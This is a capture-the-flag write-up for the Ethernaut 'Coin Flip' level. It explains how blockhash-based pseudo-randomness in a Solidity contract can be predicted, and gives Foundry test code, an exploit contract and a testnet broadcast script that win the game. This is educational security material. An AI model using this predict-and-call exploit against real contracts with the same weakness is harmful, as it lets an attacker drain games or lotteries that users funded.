## 03. Coin Flip


<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/63de48b2-4c5a-4499-b054-7fcd4a2a520d">
</p>


<br>


### tl; dr

<br>


* in this challenge, we exploit the determinism of a pseudo-random function composed uniquely of an EVM global accessible variable (`blockhash`) and no added entropy.


<br>

```solidity
contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```


<br>

---

### discussion

<br>


* the EVM is a deterministic turing machine. 
  - since it has no inherent randomness and as everything in the contracts is publicly visible (`block.timestamp`, `block.number`, etc.), generating random numbers in solidity is tricky. 
  - projects resource to external oracles or to Ethereum validator's **[RANDAO](https://github.com/randao/randao)** algorithm.

<br>

* the `CoinFlip` contract uses the current block's `blockhash` to determine the side of a coin, represented by a `bool` variable named `coinFlip`:

<br>

```solidity
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

<br>

* which is derived from the variable `blockValue` as a `uint156` generated from the previous block number (block's number minus 1):

<br>

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
```

<br>

* this `FACTOR` variable is useless. 
  - first, division by a large constant does not introduce any randomness entropy at all. 
  - second, even if this constant is private, it's still available at etherscan or by decompiling the bytecode (if the contract is not verified).

<br>

```solidity
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

<br>

* the "randomness" in this contract is calculated from on-chain deterministic data, so all we need to do is simulate `side` before we submit a guess, and repeat this ten times.

<br>

```solidity
if (side == _guess) {
  consecutiveWins++;
return true;
  } else {
    consecutiveWins = 0;
    return false;
}
```



<br>

* for this simulation, we leverage **[foundry's `vm.roll(uint256)`](https://book.getfoundry.sh/cheatcodes/roll?highlight=vm.roll#examples)**, which simulates the `block.number` given by the `uint256`.


<br>


----

### solution

<br>

* the general solution to this problem can see in the test file, `test/03/CoinFlip.t.sol`:

<br>

```solidity
import "forge-std/Test.sol";
import {CoinFlip} from "src/03/CoinFlip.sol";

contract CoinFlipTest is Test {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint8 consecutiveWinsHacked = 10;

    CoinFlip public level;
    address instance = vm.addr(0x1); 
    address hacker = vm.addr(0x2); 

    function setUp() public {

        vm.prank(instance);
        level = new CoinFlip();
    
    }

    /////////////////////////////////////////////////////
    // Copy the pseudo-random function from the contract
    ////////////////////////////////////////////////////
    function generateSide() internal view returns (bool side) {

            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            side = coinFlip == 1 ? true : false;

     }

    function testCoinFlipHack() public {

        vm.startPrank(hacker);
        assertEq(level.consecutiveWins(), 0);
    
        while (level.consecutiveWins() < consecutiveWinsHacked) {

            /////////////////////
            // "Flip" the coin
            ////////////////////
            level.flip(generateSide());

            ////////////////////////////
            // Simulate the next block
            ////////////////////////////
            vm.roll(block.number + 1);

        }

        assertEq(level.consecutiveWins(), consecutiveWinsHacked);
        vm.stopPrank();

      }
}
```

<br>

* which can be run with:

<br>

```shell
> forge test --match-contract CoinFlipTest -vvvv    
```



<br>


* because this time i wanted to run a loop in the deployment script, i removed the exploit logic from it and added it to its own contract inside `src/03/CoinFlipExploit.sol`:

<br>

```solidity
import {CoinFlip} from "src/03/CoinFlip.sol";

contract CoinFlipExploit {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip immutable level;

    constructor(CoinFlip level_) {
        level = level_;
    }

    function run() public returns (bool guess) {

        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = blockValue / FACTOR == 1 ? true : false;
        guess = level.flip(side);
    
    }
}
```

<br>


* which could be submitted with `script/03/CoinFlip.s.sol`:

<br>

```solidity
import "forge-std/Script.sol";
import {CoinFlip} from "src/03/CoinFlip.sol";
import {CoinFlipExploit} from "src/03/CoinFlipExploit.sol";


contract Exploit is Script {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    address levelInstance = 0xfC3A1c7Aaf80dAf711256cEa4d959722DbF2B5B1;
    CoinFlip level = CoinFlip(levelInstance);
    CoinFlipExploit exploit = new CoinFlipExploit(level);
 
    function run() public {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        exploit.run();
        vm.stopBroadcast();

    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/03/CoinFlip.s.sol --broadcast -vvvv --rpc-url sepolia
```


<br>

* initially, i wanted to have `exploit.run();` in a loop like this:

<br>


```solidity
uint256 count = 0;
do {
    exploit.run();
    ++count;
} while (count < GUESSES);
```

<br>

* however this never worked, and i suspected it's because of a last bit in `CoinFlip`, the `lastHash` check. 
  - i originally thought it would require each new guess submission to occur after 12 seconds (the time it takes for a new proof-of-stake block to be minted):


<br>

```solidity
if (lastHash == blockValue) {
  revert();
}

lastHash = blockValue;
```


<br>

* but that it didn't matter whether i was running with the that loop or manually (with, say, `while sleep 13; do forge script ./script/03/CoinFlip.s.sol --broadcast -vvvv --rpc-url sepolia; done`).
  - this solution never really worked (even though i spent a few hours trying to find the bug). 
  - a bit frustrating because this solution was foundry native and symmetric with the previous problems.
  - i decided i had to try a new approach... using an `interface`.


<br>


<br>

----

<br>

#### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



